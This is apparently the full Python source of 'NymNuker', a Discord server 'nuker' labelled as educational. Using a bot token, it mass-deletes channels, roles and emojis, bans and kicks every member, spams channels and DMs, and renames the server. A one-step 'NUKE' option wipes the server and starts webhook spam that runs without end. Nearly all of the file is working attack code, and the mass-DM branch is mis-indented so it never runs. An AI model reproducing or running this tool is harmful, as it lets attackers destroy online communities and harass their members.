# This script is educational and fully coded by MasterM142

import sys, os
import datetime
import requests
import time
import json
from threading import Thread
import asyncio
from random import choice

class Colors:
    RESET = '\033[0m'
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    GRAY = '\033[90m'

class Logger:
    @staticmethod
    def success(message):
        print(f"{Colors.GREEN}[SUCCESS]{Colors.RESET} {message}")
    
    @staticmethod
    def error(message):
        print(f"{Colors.RED}[ERROR]{Colors.RESET} {message}")
    
    @staticmethod
    def info(message):
        print(f"{Colors.BLUE}[INFO]{Colors.RESET} {message}")

class Tools:
    @staticmethod
    def api(endpoint):
        return f"https://discord.com/api/v9/{endpoint}"
    
    @staticmethod
    def proxy():
        return None
    
    @staticmethod
    def check_token(token):
        headers = {"Authorization": f"Bot {token}"}
        r = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        return r.status_code == 200
    
    @staticmethod
    def get_guilds(token):
        headers = {"Authorization": f"Bot {token}"}
        r = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=headers)
        if r.status_code == 200:
            return [(guild["id"], guild["name"]) for guild in r.json()]
        return []
    
    @staticmethod
    def information(guild_id, token):
        headers = {"Authorization": f"Bot {token}"}
        guild = requests.get(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers)
        user = requests.get("https://discord.com/api/v9/users/@me", headers=headers)
        
        if guild.status_code == 200 and user.status_code == 200:
            return {
                "guild": guild.json(),
                "user": user.json()
            }
        return None
    
    @staticmethod
    async def break_limit(url, token):
        headers = {"Authorization": f"Bot {token}"}
        r = requests.get(url, headers=headers)
        if r.status_code == 200:
            data = r.json()
            if data and isinstance(data, list):
                if url.endswith("/members") and data and "user" in data[0]:
                    return [item["user"]["id"] for item in data if "user" in item]
                elif "id" in data[0]:
                    return [item["id"] for item in data]
            return []
        return []

class Nuking:
    def __init__(self, token, guild_id):
        self.token = token
        self.guild_id = guild_id
        self.headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    
    def delete_channel(self, channel_id):
        r = requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=self.headers)
        return r.status_code == 200
    
    def delete_role(self, role_id):
        r = requests.delete(f"https://discord.com/api/v9/guilds/{self.guild_id}/roles/{role_id}", headers=self.headers)
        return r.status_code == 204
    
    def ban(self, user_id):
        r = requests.put(f"https://discord.com/api/v9/guilds/{self.guild_id}/bans/{user_id}", headers=self.headers)
        return r.status_code == 204
    
    def kick(self, user_id):
        r = requests.delete(f"https://discord.com/api/v9/guilds/{self.guild_id}/members/{user_id}", headers=self.headers)
        return r.status_code == 204
    
    def create_channel(self, name, channel_type):
        data = {"name": name, "type": channel_type}
        r = requests.post(f"https://discord.com/api/v9/guilds/{self.guild_id}/channels", 
                         headers=self.headers, json=data)
        if r.status_code == 201:
            return r.json()["id"]
        return None
    
    def create_role(self, name):
        data = {"name": name}
        r = requests.post(f"https://discord.com/api/v9/guilds/{self.guild_id}/roles", 
                         headers=self.headers, json=data)
        if r.status_code == 200:
            return r.json()["id"]
        return None
    
    def unban(self, user_id):
        r = requests.delete(f"https://discord.com/api/v9/guilds/{self.guild_id}/bans/{user_id}", headers=self.headers)
        return r.status_code == 204
    
    def create_webhook(self, channel_id):
        data = {"name": "NymNuker"}
        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", 
                         headers=self.headers, json=data)
        if r.status_code == 200:
            return f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
        return None
    
    def send_webhook(self, webhook_url, message, count=1):
        data = {"content": message}
        for _ in range(count):
            requests.post(webhook_url, json=data)
            time.sleep(0.5)
    
    def send_message(self, channel_id, message):
        data = {"content": message}
        r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
                         headers=self.headers, json=data)
        return r.status_code == 200
    
    def rename_channel(self, name, channel_id):
        data = {"name": name}
        r = requests.patch(f"https://discord.com/api/v9/channels/{channel_id}", 
                          headers=self.headers, json=data)
        return r.status_code == 200
    
    def rename_role(self, role_id, name):
        data = {"name": name}
        r = requests.patch(f"https://discord.com/api/v9/guilds/{self.guild_id}/roles/{role_id}", 
                          headers=self.headers, json=data)
        return r.status_code == 200
    
    def change_nick(self, user_id, nick):
        data = {"nick": nick}
        r = requests.patch(f"https://discord.com/api/v9/guilds/{self.guild_id}/members/{user_id}", 
                          headers=self.headers, json=data)
        return r.status_code == 200
    
    def rename_guild(self, name):
        data = {"name": name}
        r = requests.patch(f"https://discord.com/api/v9/guilds/{self.guild_id}", 
                          headers=self.headers, json=data)
        return r.status_code == 200
    
    def change_guild_icon(self, image_path):
        try:
            with open(image_path, "rb") as image:
                import base64
                encoded = base64.b64encode(image.read()).decode('utf-8')
                data = {"icon": f"data:image/png;base64,{encoded}"}
                r = requests.patch(f"https://discord.com/api/v9/guilds/{self.guild_id}", 
                                  headers=self.headers, json=data)
                return r.status_code == 200
        except:
            return False
    
    def remove_emoji(self, emoji_id):
        r = requests.delete(f"https://discord.com/api/v9/guilds/{self.guild_id}/emojis/{emoji_id}", 
                           headers=self.headers)
        return r.status_code == 204
    
    def send_direct_message(self, user_id, message):
        try:
            data = {"recipient_id": user_id}
            r = requests.post("https://discord.com/api/v9/users/@me/channels", 
                             headers=self.headers, json=data)
            
            if r.status_code == 200:
                channel_id = r.json()["id"]
                
                data = {"content": message}
                r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
                                 headers=self.headers, json=data)
                return r.status_code == 200
            return False
        except:
            return False
    
    def sussy_create_channel(self):
        import string
        import random
        name = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        self.create_channel(name, 0)
        name = ''.join(random.choice(string.ascii_letters) for _ in range(8))
        self.create_channel(name, 0)
        return True

def print_timestamp():
    current_time = datetime.datetime.now().strftime("%H:%M:%S")
    return f"{Colors.GRAY}[{current_time}]{Colors.RESET}"

def print_status(message, success=True):
    timestamp = print_timestamp()
    status = f"{Colors.GREEN}[SUCCESS]{Colors.RESET}" if success else f"{Colors.RED}[ERROR]{Colors.RESET}"
    print(f"{timestamp} {status} {message}")

def get_input(prompt, checker=None):
    while True:
        value = input(prompt)
        if checker is None or checker(value):
            return value
        print(f"{Colors.RED}Invalid input. Please try again.{Colors.RESET}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def set_title(title):
    if os.name == 'nt':
        os.system(f'title {title}')

def get_input_with_skip(prompt, default_value, checker=None):
    print(f"{prompt} (Press Enter to use '{default_value}')")
    while True:
        value = input("> ")
        if value == "":
            return default_value
        if checker is None or checker(value):
            return value
        print(f"{Colors.RED}Invalid input. Please try again.{Colors.RESET}")

async def main(token: str, guild_id):
    headers = {"Authorization": f"Bot {token}", "Content-Type": 'application/json'}
    clear_screen()
    
    info = Tools.information(guild_id, token)
    if not info:
        print_status("Failed to get server information", False)
        return
    
    menu = """NymNuker - Discord Server Management Tool
01. Delete All Channels    08. Webhook Spam Guild     15. Change Guild Icon
02. Delete All Roles       09. Message Spam Guild     16. Remove all emojis
03. Ban All Members        10. Rename all channels    17. DM all members
04. Kick All Members       11. Rename all roles       18. NUKE
05. Create Channels        12. Nick All Users         19. Exit
06. Create Roles           13. UnNick All users
07. Unban All Members      14. Change Guild Name"""

    async def back_to_menu():
        input(f"{Colors.RED}\n!! IF YOU WANT TO RETURN TO THE MAIN MENU, PRESS ENTER !!{Colors.RESET}\n")
        return await main(token, guild_id)

    nuker = Nuking(token, guild_id)
    print(menu)
    
    choice = get_input(f"{Colors.CYAN}Choose an option: {Colors.RESET}", 
                      lambda x: x.isnumeric() and 0 < int(x) <= 19)
    
    if len(choice) == 1:
        choice = "0" + choice
    
    print()
    
    if choice == "01":        
        url = Tools.api(f"guilds/{guild_id}/channels")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch channels with status code: {request.status_code}", False)
            return await back_to_menu()
            
        channels = [i["id"] for i in request.json()]
        
        def deleter(channel_id):
            if nuker.delete_channel(channel_id):
                print_status(f"Deleted channel {channel_id}", True)
            else:
                print_status(f"Failed to delete channel {channel_id}", False)
        
        print_status("Starting channel deletion", True)
        
        threads = []
        for channel in channels:
            t = Thread(target=deleter, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
            
    elif choice == "02":
        url = Tools.api(f"guilds/{guild_id}/roles")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch roles with status code: {request.status_code}", False)
            return await back_to_menu()
                
        roles = [i["id"] for i in request.json()]
        
        def delete_role(role):
            if nuker.delete_role(role):
                print_status(f"Deleted role {role}", True)
            else:
                print_status(f"Failed to delete role {role}", False)
        
        print_status("Starting role deletion", True)
        
        threads = []
        for role in roles:
            t = Thread(target=delete_role, args=(role,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "03":
        url = Tools.api(f"guilds/{guild_id}/members")
        users = await Tools.break_limit(url, token)
        
        def ban_member(user_id):
            if nuker.ban(user_id):
                print_status(f"Banned user {user_id}", True)
            else:
                print_status(f"Failed to ban user {user_id}", False)
        
        print_status("Starting mass ban", True)
        
        threads = []
        for user in users:
            t = Thread(target=ban_member, args=(user,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "04":
        url = Tools.api(f"guilds/{guild_id}/members")
        users = await Tools.break_limit(url, token)
        
        def kick_member(user_id):
            if nuker.kick(user_id):
                print_status(f"Kicked user {user_id}", True)
            else:
                print_status(f"Failed to kick user {user_id}", False)
        
        print_status("Starting mass kick", True)
        
        threads = []
        for user in users:
            t = Thread(target=kick_member, args=(user,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "05":
        channel_name = get_input("Enter channel name: ")
        amount = get_input("Enter amount of channels to create: ", lambda x: x.isnumeric() and int(x) > 0)
        amount = int(amount)
        
        def create_channel():
            channel_id = nuker.create_channel(channel_name, 0)  
            if channel_id:
                print_status(f"Created channel {channel_name}", True)
            else:
                print_status(f"Failed to create channel {channel_name}", False)
        
        print_status(f"Creating {amount} channels named '{channel_name}'", True)
        
        threads = []
        for _ in range(amount):
            t = Thread(target=create_channel)
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "06":
        role_name = get_input("Enter role name: ")
        amount = get_input("Enter amount of roles to create: ", lambda x: x.isnumeric() and int(x) > 0)
        amount = int(amount)
        
        def create_role():
            role_id = nuker.create_role(role_name)
            if role_id:
                print_status(f"Created role {role_name}", True)
            else:
                print_status(f"Failed to create role {role_name}", False)
        
        print_status(f"Creating {amount} roles named '{role_name}'", True)
        
        threads = []
        for _ in range(amount):
            t = Thread(target=create_role)
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "07":
        url = Tools.api(f"guilds/{guild_id}/bans")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch bans with status code: {request.status_code}", False)
            return await back_to_menu()
        
        bans = [i["user"]["id"] for i in request.json()]
        
        def unban_user(user_id):
            if nuker.unban(user_id):
                print_status(f"Unbanned user {user_id}", True)
            else:
                print_status(f"Failed to unban user {user_id}", False)
        
        print_status("Starting mass unban", True)
        
        threads = []
        for user in bans:
            t = Thread(target=unban_user, args=(user,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "08":
        message = get_input("Enter message to spam: ")
        amount = get_input("Enter amount of messages per webhook: ", lambda x: x.isnumeric() and int(x) > 0)
        amount = int(amount)
        
        url = Tools.api(f"guilds/{guild_id}/channels")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch channels with status code: {request.status_code}", False)
            return await back_to_menu()
        
        channels = [i["id"] for i in request.json() if i["type"] == 0]  
        
        def webhook_spam(channel_id):
            webhook_url = nuker.create_webhook(channel_id)
            if webhook_url:
                print_status(f"Created webhook in channel {channel_id}", True)
                nuker.send_webhook(webhook_url, message, amount)
                print_status(f"Sent {amount} messages to webhook in channel {channel_id}", True)
            else:
                print_status(f"Failed to create webhook in channel {channel_id}", False)
        
        print_status("Starting webhook spam", True)
        
        threads = []
        for channel in channels:
            t = Thread(target=webhook_spam, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "09":
        message = get_input("Enter message to spam: ")
        amount = get_input("Enter amount of messages per channel: ", lambda x: x.isnumeric() and int(x) > 0)
        amount = int(amount)
        
        url = Tools.api(f"guilds/{guild_id}/channels")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch channels with status code: {request.status_code}", False)
            return await back_to_menu()
        
        channels = [i["id"] for i in request.json() if i["type"] == 0] 
        
        def message_spam(channel_id):
            success_count = 0
            for _ in range(amount):
                if nuker.send_message(channel_id, message):
                    success_count += 1
                time.sleep(0.5) 
            
            print_status(f"Sent {success_count}/{amount} messages to channel {channel_id}", success_count > 0)
        
        print_status("Starting message spam", True)
        
        threads = []
        for channel in channels:
            t = Thread(target=message_spam, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()

    elif choice == "10":
        new_name = get_input("Enter new channel name: ")
        
        url = Tools.api(f"guilds/{guild_id}/channels")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch channels with status code: {request.status_code}", False)
            return await back_to_menu()
        
        channels = [i["id"] for i in request.json()]
        
        def rename_channel(channel_id):
            if nuker.rename_channel(new_name, channel_id):
                print_status(f"Renamed channel {channel_id} to {new_name}", True)
            else:
                print_status(f"Failed to rename channel {channel_id}", False)
        
        print_status("Starting channel renaming", True)
        
        threads = []
        for channel in channels:
            t = Thread(target=rename_channel, args=(channel,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "11":
        new_name = get_input("Enter new role name: ")
        
        url = Tools.api(f"guilds/{guild_id}/roles")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch roles with status code: {request.status_code}", False)
            return await back_to_menu()
        
        roles = [i["id"] for i in request.json()]
        
        def rename_role(role_id):
            if nuker.rename_role(role_id, new_name):
                print_status(f"Renamed role {role_id} to {new_name}", True)
            else:
                print_status(f"Failed to rename role {role_id}", False)
        
        print_status("Starting role renaming", True)
        
        threads = []
        for role in roles:
            t = Thread(target=rename_role, args=(role,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "12":
        new_nick = get_input("Enter new nickname: ")
        
        url = Tools.api(f"guilds/{guild_id}/members")
        users = await Tools.break_limit(url, token)
        
        def nick_user(user_id):
            if nuker.change_nick(user_id, new_nick):
                print_status(f"Changed nickname of user {user_id} to {new_nick}", True)
            else:
                print_status(f"Failed to change nickname of user {user_id}", False)
        
        print_status("Starting mass nickname change", True)
        
        threads = []
        for user in users:
            t = Thread(target=nick_user, args=(user,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "13":
        url = Tools.api(f"guilds/{guild_id}/members")
        users = await Tools.break_limit(url, token)
        
        def unnick_user(user_id):
            if nuker.change_nick(user_id, ""):
                print_status(f"Removed nickname of user {user_id}", True)
            else:
                print_status(f"Failed to remove nickname of user {user_id}", False)
        
        print_status("Starting mass nickname removal", True)
        
        threads = []
        for user in users:
            t = Thread(target=unnick_user, args=(user,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "14":
        new_name = get_input("Enter new server name: ")
        
        if nuker.rename_guild(new_name):
            print_status(f"Changed server name to {new_name}", True)
        else:
            print_status("Failed to change server name", False)
        
        return await back_to_menu()
    
    elif choice == "15":
        image_path = get_input("Enter path to new icon image (PNG format): ", lambda x: os.path.exists(x) and x.lower().endswith('.png'))
        
        if nuker.change_guild_icon(image_path):
            print_status("Changed server icon", True)
        else:
            print_status("Failed to change server icon", False)
        
        return await back_to_menu()
    
    elif choice == "16":
        url = Tools.api(f"guilds/{guild_id}/emojis")
        request = requests.get(url, headers=headers)
        if request.status_code != 200:
            print_status(f"Failed to fetch emojis with status code: {request.status_code}", False)
            return await back_to_menu()
        
        emojis = [i["id"] for i in request.json()]
        
        def remove_emoji(emoji_id):
            if nuker.remove_emoji(emoji_id):
                print_status(f"Removed emoji {emoji_id}", True)
            else:
                print_status(f"Failed to remove emoji {emoji_id}", False)
        
        print_status("Starting emoji removal", True)
        
        threads = []
        for emoji in emojis:
            t = Thread(target=remove_emoji, args=(emoji,))
            t.start()
            threads.append(t)
            time.sleep(0.0004)
        
        for thread in threads:
            thread.join()
        
        return await back_to_menu()
    
    elif choice == "17":
        message = get_input("Enter message to send: ")
        
        url = Tools.api(f"guilds/{guild_id}/members")
        users = await Tools.break_limit(url, token)
        
        def dm_user(user_id):
            if nuker.send_direct_message(user_id, message):
                print_status(f"Sent DM to user {user_id}", True)
            else:
                print_status(f"Failed to send DM to user {user_id}", False)
        
        print_status("Starting mass DM", True)
        print_status("Note: Bots cannot send DMs to users unless they share a server and the user has messaged the bot first", False)
        
        if not users:
            print_status("No users found or unable to fetch user IDs", False)
            return await back_to_menu()
        
            threads = []
            for user in users:
                t = Thread(target=dm_user, args=(user,))
                t.start()
                threads.append(t)
                time.sleep(0.0004)
            
            for thread in threads:
                thread.join()
            
            return await back_to_menu()    

    elif choice == "18":
        print_status("Starting server nuke", True)
        
        default_channel_name = "nuked-by-nymnuker"
        channel_name = get_input_with_skip("Enter name for the channels", default_channel_name)
        default_message = "@everyone Server has been nuked by NymNuker!"
        spam_message = get_input_with_skip("Enter message to spam in all channels", default_message)
        
        default_server_name = "Nuked By NymNuker"
        server_name = get_input_with_skip("Enter new server name", default_server_name)
        
        default_amount = "50"
        amount = get_input_with_skip("Enter number of channels to create", default_amount, lambda x: x.isnumeric() and int(x) > 0)
        amount = int(amount)
        
        webhook_spam_threads = []
        
        def continuous_webhook_spam(webhook_url):
            counter = 0
            while True:
                try:
                    counter += 1
                    data = {"content": f"{spam_message} [{counter}]"}
                    requests.post(webhook_url, json=data)
                    time.sleep(0.1)
                except:
                    time.sleep(0.5)
        
        url = Tools.api(f"guilds/{guild_id}/channels")
        request = requests.get(url, headers=headers)
        if request.status_code == 200:
            channels = [i["id"] for i in request.json()]
            
            def delete_channel(channel_id):
                try:
                    requests.delete(f"https://discord.com/api/v9/channels/{channel_id}", headers=headers)
                except:
                    pass
            
            print_status("Deleting all existing channels...", True)
            threads = []
            for channel in channels:
                t = Thread(target=delete_channel, args=(channel,))
                t.start()
                threads.append(t)
                time.sleep(0.0004)
            
            for thread in threads:
                thread.join(timeout=2)
        
        url = Tools.api(f"guilds/{guild_id}/roles")
        request = requests.get(url, headers=headers)
        if request.status_code == 200:
            roles = [i["id"] for i in request.json()]
            
            def delete_role(role_id):
                try:
                    requests.delete(f"https://discord.com/api/v9/guilds/{guild_id}/roles/{role_id}", headers=headers)
                except:
                    pass
            
            print_status("Deleting all existing roles...", True)
            threads = []
            for role in roles:
                t = Thread(target=delete_role, args=(role,))
                t.start()
                threads.append(t)
                time.sleep(0.0004)
            
            for thread in threads:
                thread.join(timeout=2)
        
        try:
            data = {"name": server_name}
            requests.patch(f"https://discord.com/api/v9/guilds/{guild_id}", headers=headers, json=data)
            print_status(f"Changed server name to '{server_name}'", True)
        except:
            print_status("Failed to change server name", False)
        
        created_channels = []
        
        def create_channel():
            try:
                data = {"name": channel_name, "type": 0}
                r = requests.post(f"https://discord.com/api/v9/guilds/{guild_id}/channels", 
                                headers=headers, json=data)
                
                if r.status_code == 201:
                    channel_id = r.json()["id"]
                    print_status(f"Created channel {channel_name} ({channel_id})", True)
                    
                    data = {"content": spam_message}
                    requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", 
                                headers=headers, json=data)
                    
                    created_channels.append(channel_id)
            except Exception as e:
                print_status(f"Error creating channel: {str(e)}", False)
        
        print_status(f"Creating {amount} channels...", True)
        
        batch_size = 5
        for i in range(0, amount, batch_size):
            batch_threads = []
            for _ in range(min(batch_size, amount - i)):
                t = Thread(target=create_channel)
                t.start()
                batch_threads.append(t)
            
            for t in batch_threads:
                t.join()
            
            time.sleep(1.5)
        
        print_status(f"Successfully created {len(created_channels)} channels", True)
        
        def create_webhook_and_spam(channel_id):
            try:
                data = {"name": "NymNuker"}
                r = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", 
                               headers=headers, json=data)
                
                if r.status_code == 200:
                    webhook_url = f"https://discord.com/api/webhooks/{r.json()['id']}/{r.json()['token']}"
                    print_status(f"Created webhook in channel {channel_id}", True)
                    
                    spam_thread = Thread(target=continuous_webhook_spam, args=(webhook_url,))
                    spam_thread.daemon = True
                    spam_thread.start()
                    webhook_spam_threads.append(spam_thread)
                    return True
                else:
                    print_status(f"Failed to create webhook in channel {channel_id} (Status: {r.status_code})", False)
                    return False
            except Exception as e:
                print_status(f"Error creating webhook: {str(e)}", False)
                return False
        
        print_status("Creating webhooks and starting spam...", True)
        
        successful_webhooks = 0
        batch_size = 2  
        
        for i in range(0, len(created_channels), batch_size):
            batch = created_channels[i:i+batch_size]
            
            for channel_id in batch:
                if create_webhook_and_spam(channel_id):
                    successful_webhooks += 1
                

                time.sleep(2)
        
        print_status(f"Created {successful_webhooks} webhook spammers that will run continuously", True)
        print_status("Spam will continue until you close the program. Press Ctrl+C to return to menu", True)
        
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print_status("Returning to menu (spam continues in background)", True)
        
        return await back_to_menu()
    
    elif choice == "19":
        print_status("Exiting...", True)
        sys.exit(0)

def start():
    clear_screen()
    set_title("NymNuker")
    
    token = get_input("Please Enter your token: ", lambda x: x != "" and Tools.check_token(x))
    print()
    
    guilds = Tools.get_guilds(token)
    if not guilds:
        print_status("No guilds found or invalid token", False)
        sys.exit(1)
    
    print(f"{Colors.CYAN}Available servers:{Colors.RESET}")
    _guilds = {}
    for i, (guild_id, guild_name) in enumerate(guilds, 1):
        print(f"{Colors.BLUE}{i}{Colors.RESET} - {Colors.MAGENTA}{guild_id}{Colors.RESET} {guild_name}")
        _guilds[str(i)] = guild_id
    
    print()
    guild_choice = get_input("Please Enter the guild id or its number: ", 
                           lambda x: x in _guilds or x in [g[0] for g in guilds])
    
    guild_id = _guilds.get(guild_choice, guild_choice)
    
    asyncio.run(main(token, guild_id))

if __name__ == "__main__":
    start()